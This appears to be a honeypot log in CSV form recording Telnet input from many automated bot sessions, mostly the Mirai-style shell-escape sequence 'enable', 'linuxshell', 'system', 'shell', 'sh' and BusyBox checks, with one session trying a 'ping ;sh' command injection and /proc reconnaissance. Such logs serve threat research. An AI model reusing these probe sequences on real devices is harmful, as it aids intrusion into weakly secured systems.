id,session,timestamp,realm,success,input
1,7e8e75d3f0fb,2026-08-28 19:31:38,,1,enable
2,7e8e75d3f0fb,2026-08-28 19:31:38,,0,enable 
3,7e8e75d3f0fb,2026-08-28 19:31:38,,1,system
4,7e8e75d3f0fb,2026-08-28 19:31:38,,0,system 
5,7e8e75d3f0fb,2026-08-28 19:31:38,,1,shell
6,7e8e75d3f0fb,2026-08-28 19:31:38,,0,shell 
7,7e8e75d3f0fb,2026-08-28 19:31:39,,1,sh
8,7e8e75d3f0fb,2026-08-28 19:31:39,,1,/bin/busybox V3G4
9,8f16fb3f1ad8,2026-08-28 19:31:47,,1,enable
10,8f16fb3f1ad8,2026-08-28 19:31:47,,0,enable 
11,8f16fb3f1ad8,2026-08-28 19:32:08,,1,linuxshell
12,8f16fb3f1ad8,2026-08-28 19:32:08,,0,linuxshell 
13,7ed31c85f2d0,2026-08-28 19:33:10,,1,enable
14,7ed31c85f2d0,2026-08-28 19:33:10,,0,enable 
15,7ed31c85f2d0,2026-08-28 19:33:20,,1,linuxshell
16,7ed31c85f2d0,2026-08-28 19:33:20,,0,linuxshell 
17,8f16fb3f1ad8,2026-08-28 19:33:22,,1,system
18,8f16fb3f1ad8,2026-08-28 19:33:22,,0,system 
19,7ed31c85f2d0,2026-08-28 19:33:29,,1,system
20,7ed31c85f2d0,2026-08-28 19:33:29,,0,system 
21,7ed31c85f2d0,2026-08-28 19:33:38,,1,shell
22,7ed31c85f2d0,2026-08-28 19:33:38,,0,shell 
23,7ed31c85f2d0,2026-08-28 19:33:47,,1,sh
24,7ed31c85f2d0,2026-08-28 19:33:56,,1,/bin/busybox UNSTABLE
25,cc488fd079cf,2026-08-28 19:37:42,,1,enable
26,cc488fd079cf,2026-08-28 19:37:42,,0,enable 
27,6cd925b59377,2026-08-28 19:37:43,,1,enable
28,6cd925b59377,2026-08-28 19:37:43,,0,enable 
29,6cd925b59377,2026-08-28 19:37:43,,1,linuxshell
30,6cd925b59377,2026-08-28 19:37:43,,0,linuxshell 
31,6cd925b59377,2026-08-28 19:37:44,,1,system
32,6cd925b59377,2026-08-28 19:37:44,,0,system 
33,6cd925b59377,2026-08-28 19:37:44,,1,shell
34,6cd925b59377,2026-08-28 19:37:44,,0,shell 
35,6cd925b59377,2026-08-28 19:37:45,,1,sh
36,6cd925b59377,2026-08-28 19:37:46,,1,/bin/busybox UNSTABLE
37,cc488fd079cf,2026-08-28 19:37:47,,1,linuxshell
38,cc488fd079cf,2026-08-28 19:37:47,,0,linuxshell 
39,cc488fd079cf,2026-08-28 19:38:24,,1,system
40,cc488fd079cf,2026-08-28 19:38:24,,0,system 
41,280786eb7e13,2026-08-28 19:39:32,,1,enable
42,280786eb7e13,2026-08-28 19:39:32,,0,enable 
43,280786eb7e13,2026-08-28 19:39:32,,1,system
44,280786eb7e13,2026-08-28 19:39:32,,0,system 
45,280786eb7e13,2026-08-28 19:39:32,,1,shell
46,280786eb7e13,2026-08-28 19:39:32,,0,shell 
47,280786eb7e13,2026-08-28 19:39:32,,1,sh
48,280786eb7e13,2026-08-28 19:39:32,,1,linuxshell
49,280786eb7e13,2026-08-28 19:39:32,,0,linuxshell 
50,280786eb7e13,2026-08-28 19:39:32,,1,enablelinuxshell
51,280786eb7e13,2026-08-28 19:39:32,,0,enablelinuxshell 
52,280786eb7e13,2026-08-28 19:39:32,,1,ping ;sh
53,280786eb7e13,2026-08-28 19:39:32,,1,"echo -e ""\x47\x41\x59\x46\x47\x54"""
54,280786eb7e13,2026-08-28 19:39:33,,1,cd /proc && cat self/cmdline
55,280786eb7e13,2026-08-28 19:39:34,,1,"echo -e ""\x47\x41\x59\x46\x47\x54"""
56,cc488fd079cf,2026-08-28 19:40:00,,1,shell
57,cc488fd079cf,2026-08-28 19:40:00,,0,shell 
58,a8044e1fab4b,2026-08-28 19:40:29,,1,enable
59,a8044e1fab4b,2026-08-28 19:40:29,,0,enable 
60,67d7c59544bc,2026-08-28 19:40:59,,1,enable
61,67d7c59544bc,2026-08-28 19:40:59,,0,enable 
62,2020329c8e9d,2026-08-28 19:41:28,,1,enable
63,2020329c8e9d,2026-08-28 19:41:28,,0,enable 
64,53b72efe5f92,2026-08-28 19:41:30,,1,enable
65,53b72efe5f92,2026-08-28 19:41:30,,0,enable 
66,a8044e1fab4b,2026-08-28 19:41:33,,1,linuxshell
67,a8044e1fab4b,2026-08-28 19:41:33,,0,linuxshell 
68,6c79f45c7cd1,2026-08-28 19:41:36,,1,enable
69,6c79f45c7cd1,2026-08-28 19:41:36,,0,enable 
70,a8044e1fab4b,2026-08-28 19:42:21,,1,system
71,a8044e1fab4b,2026-08-28 19:42:21,,0,system 
72,6c79f45c7cd1,2026-08-28 19:42:35,,1,linuxshell
73,6c79f45c7cd1,2026-08-28 19:42:35,,0,linuxshell 
74,90b3dccfda19,2026-08-28 19:43:46,,1,enable
75,90b3dccfda19,2026-08-28 19:43:46,,0,enable 
76,53d63417b676,2026-08-28 19:45:54,,1,enable
77,53d63417b676,2026-08-28 19:45:54,,0,enable 
78,53d63417b676,2026-08-28 19:45:54,,1,linuxshell
79,53d63417b676,2026-08-28 19:45:54,,0,linuxshell 
80,53d63417b676,2026-08-28 19:45:55,,1,system
81,53d63417b676,2026-08-28 19:45:55,,0,system 
82,53d63417b676,2026-08-28 19:45:56,,1,shell
83,53d63417b676,2026-08-28 19:45:56,,0,shell 
84,2bb57aa7eb28,2026-08-28 19:47:06,,1,enable
85,2bb57aa7eb28,2026-08-28 19:47:06,,0,enable 
86,2bb57aa7eb28,2026-08-28 19:47:06,,1,linuxshell
87,2bb57aa7eb28,2026-08-28 19:47:06,,0,linuxshell 
88,53d63417b676,2026-08-28 19:47:12,,1,sh
89,2bb57aa7eb28,2026-08-28 19:47:26,,1,system
90,2bb57aa7eb28,2026-08-28 19:47:26,,0,system 
91,afcfce4d3da8,2026-08-28 19:56:30,,1,enable
92,afcfce4d3da8,2026-08-28 19:56:35,,0,enable 
93,7c309a640e32,2026-08-28 19:58:02,,1,enable
94,7c309a640e32,2026-08-28 19:58:02,,0,enable 
95,7c309a640e32,2026-08-28 19:58:58,,1,linuxshell
96,7c309a640e32,2026-08-28 19:58:58,,0,linuxshell 
97,7c309a640e32,2026-08-28 20:00:57,,1,system
98,7c309a640e32,2026-08-28 20:01:44,,0,system 
99,04cf493abe75,2026-08-28 20:03:40,,1,enable
100,04cf493abe75,2026-08-28 20:04:11,,0,enable 
101,d3f27a0b8a77,2026-08-28 20:21:25,,1,enable
102,d3f27a0b8a77,2026-08-28 20:21:25,,0,enable 
103,d3f27a0b8a77,2026-08-28 20:21:25,,1,linuxshell
104,d3f27a0b8a77,2026-08-28 20:21:25,,0,linuxshell 
105,d3f27a0b8a77,2026-08-28 20:21:32,,1,system
106,d3f27a0b8a77,2026-08-28 20:21:32,,0,system 
107,d3f27a0b8a77,2026-08-28 20:23:18,,1,shell
108,d3f27a0b8a77,2026-08-28 20:23:18,,0,shell 
109,acf5d7fc3e2c,2026-08-28 20:25:58,,1,enable
110,acf5d7fc3e2c,2026-08-28 20:25:58,,0,enable 
111,acf5d7fc3e2c,2026-08-28 20:25:58,,1,linuxshell
112,acf5d7fc3e2c,2026-08-28 20:25:58,,0,linuxshell 
113,79c1f7068131,2026-08-28 20:26:10,,1,enable
114,79c1f7068131,2026-08-28 20:26:10,,0,enable 
115,acf5d7fc3e2c,2026-08-28 20:26:18,,1,system
116,acf5d7fc3e2c,2026-08-28 20:26:18,,0,system 
117,79c1f7068131,2026-08-28 20:26:19,,1,linuxshell
118,79c1f7068131,2026-08-28 20:26:19,,0,linuxshell 
119,849c03927288,2026-08-28 20:26:58,,1,enable
120,849c03927288,2026-08-28 20:26:58,,0,enable 
121,097400b65d7f,2026-08-28 20:27:16,,1,enable
122,097400b65d7f,2026-08-28 20:27:16,,0,enable 
123,1e05c0de41cc,2026-08-28 20:27:19,,1,enable
124,1e05c0de41cc,2026-08-28 20:27:19,,0,enable 
125,acf5d7fc3e2c,2026-08-28 20:27:39,,1,shell
126,acf5d7fc3e2c,2026-08-28 20:27:39,,0,shell 
127,79c1f7068131,2026-08-28 20:27:41,,1,system
128,79c1f7068131,2026-08-28 20:27:41,,0,system 
129,849c03927288,2026-08-28 20:28:21,,1,linuxshell
130,849c03927288,2026-08-28 20:28:21,,0,linuxshell 
131,097400b65d7f,2026-08-28 20:28:22,,1,linuxshell
132,097400b65d7f,2026-08-28 20:28:22,,0,linuxshell 
133,79c1f7068131,2026-08-28 20:28:26,,1,shell
134,79c1f7068131,2026-08-28 20:28:26,,0,shell 
135,79c1f7068131,2026-08-28 20:28:26,,1,sh
136,79c1f7068131,2026-08-28 20:28:27,,1,/bin/busybox UNSTABLE
137,1e05c0de41cc,2026-08-28 20:28:43,,1,linuxshell
138,1e05c0de41cc,2026-08-28 20:28:43,,0,linuxshell 
139,097400b65d7f,2026-08-28 20:29:42,,1,system
140,097400b65d7f,2026-08-28 20:29:42,,0,system 
141,097400b65d7f,2026-08-28 20:29:42,,1,shell
142,097400b65d7f,2026-08-28 20:29:42,,0,shell 
143,849c03927288,2026-08-28 20:29:54,,1,system
144,849c03927288,2026-08-28 20:29:54,,0,system 
145,cdaf4a73646e,2026-08-28 20:30:04,,1,enable
146,cdaf4a73646e,2026-08-28 20:30:04,,0,enable 
147,cdaf4a73646e,2026-08-28 20:30:11,,1,linuxshell
148,cdaf4a73646e,2026-08-28 20:30:11,,0,linuxshell 
149,88764bb58861,2026-08-28 20:30:35,,1,enable
150,88764bb58861,2026-08-28 20:30:35,,0,enable 
151,88764bb58861,2026-08-28 20:30:36,,1,linuxshell
152,88764bb58861,2026-08-28 20:30:36,,0,linuxshell 
153,88764bb58861,2026-08-28 20:31:32,,1,system
154,88764bb58861,2026-08-28 20:31:32,,0,system 
155,cdaf4a73646e,2026-08-28 20:31:46,,1,system
156,cdaf4a73646e,2026-08-28 20:31:46,,0,system 
157,db7626d90c4a,2026-08-28 20:31:53,,1,enable
158,db7626d90c4a,2026-08-28 20:31:53,,0,enable 
159,db7626d90c4a,2026-08-28 20:31:54,,1,linuxshell
160,db7626d90c4a,2026-08-28 20:31:54,,0,linuxshell 
161,db7626d90c4a,2026-08-28 20:31:54,,1,system
162,db7626d90c4a,2026-08-28 20:31:54,,0,system 
163,db7626d90c4a,2026-08-28 20:31:55,,1,shell
164,db7626d90c4a,2026-08-28 20:31:55,,0,shell 
165,db7626d90c4a,2026-08-28 20:31:55,,1,sh
166,db7626d90c4a,2026-08-28 20:31:56,,1,/bin/busybox UNSTABLE
167,1cfe2a9438fc,2026-08-28 20:32:17,,1,enable
168,1cfe2a9438fc,2026-08-28 20:32:17,,0,enable 
169,76bc238d1ac4,2026-08-28 20:32:19,,1,enable
170,76bc238d1ac4,2026-08-28 20:32:19,,0,enable 
171,88764bb58861,2026-08-28 20:32:19,,1,shell
172,88764bb58861,2026-08-28 20:32:19,,0,shell 
173,cb86965d3b2b,2026-08-28 20:32:37,,1,enable
174,cb86965d3b2b,2026-08-28 20:32:37,,0,enable 
175,cb86965d3b2b,2026-08-28 20:32:38,,1,linuxshell
176,cb86965d3b2b,2026-08-28 20:32:38,,0,linuxshell 
177,cb86965d3b2b,2026-08-28 20:32:38,,1,system
178,cb86965d3b2b,2026-08-28 20:32:38,,0,system 
179,cb86965d3b2b,2026-08-28 20:32:38,,1,shell
180,cb86965d3b2b,2026-08-28 20:32:38,,0,shell 
181,217009897008,2026-08-28 21:00:51,,1,enable
182,217009897008,2026-08-28 21:00:51,,0,enable 
183,217009897008,2026-08-28 21:01:06,,1,linuxshell
184,217009897008,2026-08-28 21:01:06,,0,linuxshell 
185,7664d0d9e9bf,2026-08-28 21:05:39,,1,enable
186,7664d0d9e9bf,2026-08-28 21:05:39,,0,enable 
187,7664d0d9e9bf,2026-08-28 21:07:03,,1,linuxshell
188,7664d0d9e9bf,2026-08-28 21:07:04,,0,linuxshell 
189,98ca524d79d8,2026-08-28 21:09:50,,1,enable
190,98ca524d79d8,2026-08-28 21:09:51,,0,enable 
191,5413c93e403f,2026-08-28 21:10:23,,1,enable
192,5413c93e403f,2026-08-28 21:10:23,,0,enable 
193,94572aa93028,2026-08-28 21:11:07,,1,enable
194,94572aa93028,2026-08-28 21:11:07,,0,enable 
195,098f36152fcc,2026-08-28 21:11:45,,1,enable
196,098f36152fcc,2026-08-28 21:11:45,,0,enable 
197,69ae19f83910,2026-08-28 21:11:48,,1,enable
198,69ae19f83910,2026-08-28 21:11:48,,0,enable 
199,94572aa93028,2026-08-28 21:12:15,,1,linuxshell
200,94572aa93028,2026-08-28 21:12:15,,0,linuxshell 
201,94572aa93028,2026-08-28 21:12:16,,1,system
202,94572aa93028,2026-08-28 21:12:16,,0,system 
203,94572aa93028,2026-08-28 21:12:16,,1,shell
204,94572aa93028,2026-08-28 21:12:16,,0,shell 
205,94572aa93028,2026-08-28 21:12:17,,1,sh
206,94572aa93028,2026-08-28 21:12:17,,1,/bin/busybox UNSTABLE
207,4cfd3c5711b1,2026-08-28 21:13:14,,1,enable
208,4cfd3c5711b1,2026-08-28 21:13:14,,0,enable 
209,69ae19f83910,2026-08-28 21:13:27,,1,linuxshell
210,69ae19f83910,2026-08-28 21:13:28,,0,linuxshell 
211,098f36152fcc,2026-08-28 21:13:32,,1,linuxshell
212,098f36152fcc,2026-08-28 21:13:32,,0,linuxshell 
213,2f982b87ac8e,2026-08-28 21:15:31,,1,enable
214,2f982b87ac8e,2026-08-28 21:15:31,,0,enable 
215,015cdba82685,2026-08-28 21:20:14,,1,enable
216,015cdba82685,2026-08-28 21:20:14,,0,enable 
217,f5b3c7063940,2026-08-28 21:20:28,,1,enable
218,f5b3c7063940,2026-08-28 21:20:28,,0,enable 
219,f5b3c7063940,2026-08-28 21:20:29,,1,linuxshell
220,f5b3c7063940,2026-08-28 21:20:29,,0,linuxshell 
221,f5b3c7063940,2026-08-28 21:20:29,,1,system
222,f5b3c7063940,2026-08-28 21:20:29,,0,system 
223,f5b3c7063940,2026-08-28 21:20:30,,1,shell
224,f5b3c7063940,2026-08-28 21:20:30,,0,shell 
225,f5b3c7063940,2026-08-28 21:20:31,,1,sh
226,015cdba82685,2026-08-28 21:21:23,,1,linuxshell
227,015cdba82685,2026-08-28 21:21:24,,0,linuxshell 
228,f5b3c7063940,2026-08-28 21:21:50,,1,/bin/busybox UNSTABLE
229,3d0e9acad13f,2026-08-28 21:22:52,,1,enable
230,3d0e9acad13f,2026-08-28 21:22:52,,0,enable 
231,3d0e9acad13f,2026-08-28 21:24:35,,1,linuxshell
232,3d0e9acad13f,2026-08-28 21:24:36,,0,linuxshell 
233,c5754d7b40c7,2026-08-28 21:24:49,,1,enable
234,c5754d7b40c7,2026-08-28 21:24:50,,0,enable 
235,c5754d7b40c7,2026-08-28 21:26:30,,1,linuxshell
236,c5754d7b40c7,2026-08-28 21:26:31,,0,linuxshell 
237,87fab8846395,2026-08-28 21:32:12,,1,enable
238,87fab8846395,2026-08-28 21:32:12,,0,enable 
239,ba4d2d26ceba,2026-08-28 21:32:25,,1,enable
240,ba4d2d26ceba,2026-08-28 21:32:25,,0,enable 
241,87fab8846395,2026-08-28 21:33:39,,1,linuxshell
242,87fab8846395,2026-08-28 21:33:40,,0,linuxshell 
243,ba4d2d26ceba,2026-08-28 21:33:59,,1,linuxshell
244,ba4d2d26ceba,2026-08-28 21:33:59,,0,linuxshell 
245,a4fc0ce4a6f5,2026-08-28 21:35:07,,1,enable
246,a4fc0ce4a6f5,2026-08-28 21:35:07,,0,enable 
247,6b3b9b0dfda0,2026-08-28 21:36:17,,1,enable
248,6b3b9b0dfda0,2026-08-28 21:36:17,,0,enable 
249,bc28fdd3ac7b,2026-08-28 21:37:44,,1,enable
250,bc28fdd3ac7b,2026-08-28 21:37:45,,0,enable 
251,35bafd2a0658,2026-08-28 21:37:57,,1,enable
252,35bafd2a0658,2026-08-28 21:37:58,,0,enable 
253,32bce5e1962e,2026-08-28 21:38:20,,1,enable
254,32bce5e1962e,2026-08-28 21:38:20,,0,enable 
255,35bafd2a0658,2026-08-28 21:38:40,,1,linuxshell
256,35bafd2a0658,2026-08-28 21:38:40,,0,linuxshell 
257,35bafd2a0658,2026-08-28 21:38:40,,1,system
258,35bafd2a0658,2026-08-28 21:38:41,,0,system 
259,32bce5e1962e,2026-08-28 21:39:20,,1,linuxshell
260,32bce5e1962e,2026-08-28 21:39:21,,0,linuxshell 
261,bc28fdd3ac7b,2026-08-28 21:39:22,,1,linuxshell
262,bc28fdd3ac7b,2026-08-28 21:39:22,,0,linuxshell 
263,35bafd2a0658,2026-08-28 21:39:28,,1,shell
264,35bafd2a0658,2026-08-28 21:39:28,,0,shell 
265,99af8d5d6acd,2026-08-28 21:40:06,,1,enable
266,99af8d5d6acd,2026-08-28 21:40:08,,0,enable 
267,a93b488aff1d,2026-08-28 21:40:46,,1,enable
268,a93b488aff1d,2026-08-28 21:40:47,,0,enable 
269,50a06d846187,2026-08-28 21:43:14,,1,enable
270,50a06d846187,2026-08-28 21:43:15,,0,enable 
271,50a06d846187,2026-08-28 21:43:15,,1,linuxshell
272,50a06d846187,2026-08-28 21:43:15,,0,linuxshell 
273,50a06d846187,2026-08-28 21:43:17,,1,system
274,50a06d846187,2026-08-28 21:43:17,,0,system 
275,36594f5960d7,2026-08-28 21:43:19,,1,enable
276,36594f5960d7,2026-08-28 21:43:19,,0,enable 
277,26bdf7c1bc4c,2026-08-28 21:43:42,,1,enable
278,26bdf7c1bc4c,2026-08-28 21:43:42,,0,enable 
279,50a06d846187,2026-08-28 21:44:07,,1,shell
280,50a06d846187,2026-08-28 21:44:08,,0,shell 
281,36594f5960d7,2026-08-28 21:44:38,,1,linuxshell
282,36594f5960d7,2026-08-28 21:44:39,,0,linuxshell 
283,18b4967af943,2026-08-28 21:45:00,,1,enable
284,18b4967af943,2026-08-28 21:45:00,,0,enable 
285,26bdf7c1bc4c,2026-08-28 21:45:04,,1,linuxshell
286,26bdf7c1bc4c,2026-08-28 21:45:04,,0,linuxshell 
287,26bdf7c1bc4c,2026-08-28 21:45:32,,1,system
288,26bdf7c1bc4c,2026-08-28 21:45:32,,0,system 
289,18b4967af943,2026-08-28 21:45:36,,1,linuxshell
290,18b4967af943,2026-08-28 21:45:36,,0,linuxshell 
291,8e57ac0e3739,2026-08-28 21:48:42,,1,enable
292,8e57ac0e3739,2026-08-28 21:48:42,,0,enable 
293,8e57ac0e3739,2026-08-28 21:48:43,,1,linuxshell
294,8e57ac0e3739,2026-08-28 21:48:43,,0,linuxshell 
295,8e57ac0e3739,2026-08-28 21:49:05,,1,system
296,8e57ac0e3739,2026-08-28 21:49:06,,0,system 
297,996fb32cb7af,2026-08-28 21:49:27,,1,enable
298,996fb32cb7af,2026-08-28 21:49:27,,0,enable 
299,8e57ac0e3739,2026-08-28 21:50:00,,1,shell
300,8e57ac0e3739,2026-08-28 21:50:00,,0,shell 
301,32381e5426dd,2026-08-28 21:50:12,,1,enable
302,32381e5426dd,2026-08-28 21:50:13,,0,enable 
303,e8a7c69d2e1f,2026-08-28 21:50:52,,1,enable
304,e8a7c69d2e1f,2026-08-28 21:50:52,,0,enable 
305,b3b9191e7115,2026-08-28 21:50:59,,1,enable
306,b3b9191e7115,2026-08-28 21:51:00,,0,enable 
307,8e57ac0e3739,2026-08-28 21:51:10,,1,sh
308,8e57ac0e3739,2026-08-28 21:51:10,,1,/bin/busybox UNSTABLE
309,32381e5426dd,2026-08-28 21:51:39,,1,linuxshell
310,32381e5426dd,2026-08-28 21:51:40,,0,linuxshell 
311,32381e5426dd,2026-08-28 21:51:40,,1,system
312,32381e5426dd,2026-08-28 21:51:40,,0,system 
313,32381e5426dd,2026-08-28 21:51:40,,1,shell
314,32381e5426dd,2026-08-28 21:51:40,,0,shell 
315,12832113bea0,2026-08-28 21:51:55,,1,enable
316,12832113bea0,2026-08-28 21:51:55,,0,enable 
317,12832113bea0,2026-08-28 21:51:56,,1,linuxshell
318,12832113bea0,2026-08-28 21:51:56,,0,linuxshell 
319,a32d585fecaa,2026-08-28 21:51:56,,1,enable
320,a32d585fecaa,2026-08-28 21:51:56,,0,enable 
321,12832113bea0,2026-08-28 21:52:03,,1,system
322,12832113bea0,2026-08-28 21:52:04,,0,system 
323,b3b9191e7115,2026-08-28 21:52:08,,1,linuxshell
324,b3b9191e7115,2026-08-28 21:52:08,,0,linuxshell 
325,8e2966e30db9,2026-08-28 21:52:19,,1,enable
326,8e2966e30db9,2026-08-28 21:52:20,,0,enable 
327,a32d585fecaa,2026-08-28 21:52:36,,1,linuxshell
328,a32d585fecaa,2026-08-28 21:52:36,,0,linuxshell 
329,12832113bea0,2026-08-28 21:52:42,,1,shell
330,12832113bea0,2026-08-28 21:52:42,,0,shell 
331,12832113bea0,2026-08-28 21:52:43,,1,sh
332,a32d585fecaa,2026-08-28 21:53:11,,1,system
333,a32d585fecaa,2026-08-28 21:53:11,,0,system 
334,cbf09e9c4dc5,2026-08-28 21:53:45,,1,enable
335,cbf09e9c4dc5,2026-08-28 21:53:46,,0,enable 
336,12832113bea0,2026-08-28 21:54:05,,1,/bin/busybox UNSTABLE
337,8e2966e30db9,2026-08-28 21:54:14,,1,linuxshell
338,8e2966e30db9,2026-08-28 21:54:14,,0,linuxshell 
339,f4fa380f0ba0,2026-08-28 21:54:45,,1,enable
340,f4fa380f0ba0,2026-08-28 21:54:45,,0,enable 
341,1baa178a22eb,2026-08-28 21:55:03,,1,enable
342,1baa178a22eb,2026-08-28 21:55:03,,0,enable 
343,f4fa380f0ba0,2026-08-28 21:55:06,,1,linuxshell
344,f4fa380f0ba0,2026-08-28 21:55:06,,0,linuxshell 
345,cbf09e9c4dc5,2026-08-28 21:55:06,,1,linuxshell
346,cbf09e9c4dc5,2026-08-28 21:55:06,,0,linuxshell 
347,c160482fe727,2026-08-28 21:55:24,,1,enable
348,c160482fe727,2026-08-28 21:55:25,,0,enable 
349,f4fa380f0ba0,2026-08-28 21:55:49,,1,system
350,f4fa380f0ba0,2026-08-28 21:55:49,,0,system 
351,f4fa380f0ba0,2026-08-28 21:56:04,,1,shell
352,f4fa380f0ba0,2026-08-28 21:56:05,,0,shell 
353,c160482fe727,2026-08-28 21:56:05,,1,linuxshell
354,c160482fe727,2026-08-28 21:56:05,,0,linuxshell 
355,1baa178a22eb,2026-08-28 21:56:44,,1,linuxshell
356,1baa178a22eb,2026-08-28 21:56:45,,0,linuxshell 
357,f4fa380f0ba0,2026-08-28 21:56:48,,1,sh
358,f4fa380f0ba0,2026-08-28 21:57:35,,1,/bin/busybox UNSTABLE
359,1baa178a22eb,2026-08-28 21:57:48,,1,system
360,1baa178a22eb,2026-08-28 21:57:48,,0,system 
361,588fb36d904c,2026-08-28 21:58:00,,1,enable
362,588fb36d904c,2026-08-28 21:58:00,,0,enable 
363,d0eab577ceb5,2026-08-28 22:01:47,,1,enable
364,d0eab577ceb5,2026-08-28 22:01:47,,0,enable 
365,10ea67117a9d,2026-08-28 22:01:59,,1,enable
366,10ea67117a9d,2026-08-28 22:01:59,,0,enable 
367,d0eab577ceb5,2026-08-28 22:02:26,,1,linuxshell
368,d0eab577ceb5,2026-08-28 22:02:26,,0,linuxshell 
369,08453c8c1186,2026-08-28 22:03:04,,1,enable
370,08453c8c1186,2026-08-28 22:03:04,,0,enable 
371,08453c8c1186,2026-08-28 22:03:05,,1,linuxshell
372,08453c8c1186,2026-08-28 22:03:06,,0,linuxshell 
373,08453c8c1186,2026-08-28 22:03:06,,1,system
374,08453c8c1186,2026-08-28 22:03:06,,0,system 
375,08453c8c1186,2026-08-28 22:03:08,,1,shell
376,08453c8c1186,2026-08-28 22:03:08,,0,shell 
377,08453c8c1186,2026-08-28 22:04:17,,1,sh
378,9c90f5b3a260,2026-08-28 22:06:34,,1,enable
379,9c90f5b3a260,2026-08-28 22:06:34,,0,enable 
380,96ea7566c005,2026-08-28 22:06:38,,1,enable
381,96ea7566c005,2026-08-28 22:06:39,,0,enable 
382,8fd4624a8d1e,2026-08-28 22:06:55,,1,enable
383,8fd4624a8d1e,2026-08-28 22:06:56,,0,enable 
384,9c90f5b3a260,2026-08-28 22:07:16,,1,linuxshell
385,9c90f5b3a260,2026-08-28 22:07:16,,0,linuxshell 
386,9c90f5b3a260,2026-08-28 22:07:16,,1,system
387,9c90f5b3a260,2026-08-28 22:07:16,,0,system 
388,9c90f5b3a260,2026-08-28 22:07:17,,1,shell
389,9c90f5b3a260,2026-08-28 22:07:17,,0,shell 
390,9c90f5b3a260,2026-08-28 22:07:17,,1,sh
391,9c90f5b3a260,2026-08-28 22:07:18,,1,/bin/busybox UNSTABLE
392,734c707345a3,2026-08-28 22:07:25,,1,system
393,734c707345a3,2026-08-28 22:07:25,,0,system 
394,734c707345a3,2026-08-28 22:07:26,,1,shell
395,734c707345a3,2026-08-28 22:07:26,,0,shell 
396,734c707345a3,2026-08-28 22:07:26,,1,sh
397,96ea7566c005,2026-08-28 22:07:48,,1,linuxshell
398,96ea7566c005,2026-08-28 22:07:48,,0,linuxshell 
399,f7cd872833ac,2026-08-28 22:07:51,,1,enable
400,f7cd872833ac,2026-08-28 22:07:51,,0,enable 
401,f7cd872833ac,2026-08-28 22:07:52,,1,linuxshell
402,f7cd872833ac,2026-08-28 22:07:52,,0,linuxshell 
403,f7cd872833ac,2026-08-28 22:07:59,,1,system
404,f7cd872833ac,2026-08-28 22:07:59,,0,system 
405,96ea7566c005,2026-08-28 22:08:29,,1,system
406,96ea7566c005,2026-08-28 22:08:29,,0,system 
407,734c707345a3,2026-08-28 22:08:47,,1,/bin/busybox UNSTABLE
408,96ea7566c005,2026-08-28 22:09:06,,1,shell
409,96ea7566c005,2026-08-28 22:09:06,,0,shell 
410,96ea7566c005,2026-08-28 22:09:11,,1,sh
411,c5470fc472ab,2026-08-28 22:10:29,,1,enable
412,c5470fc472ab,2026-08-28 22:10:29,,0,enable 
413,68ed1fa6e4f2,2026-08-28 22:10:47,,1,enable
414,68ed1fa6e4f2,2026-08-28 22:10:48,,0,enable 
415,759bf7905f2d,2026-08-28 22:11:08,,1,enable
416,759bf7905f2d,2026-08-28 22:11:08,,0,enable 
417,68ed1fa6e4f2,2026-08-28 22:11:33,,1,linuxshell
418,68ed1fa6e4f2,2026-08-28 22:11:34,,0,linuxshell 
419,c5470fc472ab,2026-08-28 22:11:34,,1,linuxshell
420,c5470fc472ab,2026-08-28 22:11:34,,0,linuxshell 
421,43c255b9ddfb,2026-08-28 22:11:58,,1,enable
422,43c255b9ddfb,2026-08-28 22:11:59,,0,enable 
423,68ed1fa6e4f2,2026-08-28 22:12:47,,1,system
424,68ed1fa6e4f2,2026-08-28 22:12:47,,0,system 
425,43c255b9ddfb,2026-08-28 22:13:18,,1,linuxshell
426,43c255b9ddfb,2026-08-28 22:13:18,,0,linuxshell 
427,ae2b661fc330,2026-08-28 22:15:04,,1,enable
428,ae2b661fc330,2026-08-28 22:15:04,,0,enable 
429,8bc144a13cec,2026-08-28 22:18:15,,1,enable
430,8bc144a13cec,2026-08-28 22:18:16,,0,enable 
431,0286d73ecfbc,2026-08-28 22:20:01,,1,enable
432,0286d73ecfbc,2026-08-28 22:20:01,,0,enable 
433,520012f1d904,2026-08-28 22:20:39,,1,enable
434,520012f1d904,2026-08-28 22:20:39,,0,enable 
435,65711a6c4659,2026-08-28 22:20:41,,1,enable
436,65711a6c4659,2026-08-28 22:20:41,,0,enable 
437,65711a6c4659,2026-08-28 22:20:42,,1,linuxshell
438,65711a6c4659,2026-08-28 22:20:42,,0,linuxshell 
439,65711a6c4659,2026-08-28 22:20:42,,1,system
440,65711a6c4659,2026-08-28 22:20:42,,0,system 
441,65711a6c4659,2026-08-28 22:20:43,,1,shell
442,65711a6c4659,2026-08-28 22:20:43,,0,shell 
443,65711a6c4659,2026-08-28 22:20:43,,1,sh
444,65711a6c4659,2026-08-28 22:20:49,,1,/bin/busybox UNSTABLE
445,3772871eac97,2026-08-28 22:23:49,,1,enable
446,3772871eac97,2026-08-28 22:23:50,,0,enable 
447,942c3bf74843,2026-08-28 22:25:19,,1,enable
448,942c3bf74843,2026-08-28 22:25:19,,0,enable 
449,8a9ddd939404,2026-08-28 22:25:26,,1,enable
450,8a9ddd939404,2026-08-28 22:25:26,,0,enable 
451,76583d5a9c1f,2026-08-28 22:25:44,,1,enable
452,76583d5a9c1f,2026-08-28 22:25:44,,0,enable 
453,7be33abe24b9,2026-08-28 22:25:57,,1,enable
454,7be33abe24b9,2026-08-28 22:25:58,,0,enable 
455,76583d5a9c1f,2026-08-28 22:26:22,,1,linuxshell
456,76583d5a9c1f,2026-08-28 22:26:22,,0,linuxshell 
457,8a9ddd939404,2026-08-28 22:26:26,,1,linuxshell
458,8a9ddd939404,2026-08-28 22:26:27,,0,linuxshell 
459,942c3bf74843,2026-08-28 22:26:48,,1,linuxshell
460,942c3bf74843,2026-08-28 22:26:48,,0,linuxshell 
461,73bbe5dfab60,2026-08-28 22:27:15,,1,enable
462,73bbe5dfab60,2026-08-28 22:27:15,,0,enable 
463,c7acc357eb08,2026-08-28 22:27:26,,1,enable
464,c7acc357eb08,2026-08-28 22:27:27,,0,enable 
465,8a9ddd939404,2026-08-28 22:27:48,,1,system
466,8a9ddd939404,2026-08-28 22:27:49,,0,system 
467,8cff144c48e0,2026-08-28 22:28:12,,1,enable
468,8cff144c48e0,2026-08-28 22:28:12,,0,enable 
469,c7acc357eb08,2026-08-28 22:28:39,,1,linuxshell
470,c7acc357eb08,2026-08-28 22:28:40,,0,linuxshell 
471,c7acc357eb08,2026-08-28 22:28:40,,1,system
472,c7acc357eb08,2026-08-28 22:28:40,,0,system 
473,c7acc357eb08,2026-08-28 22:28:41,,1,shell
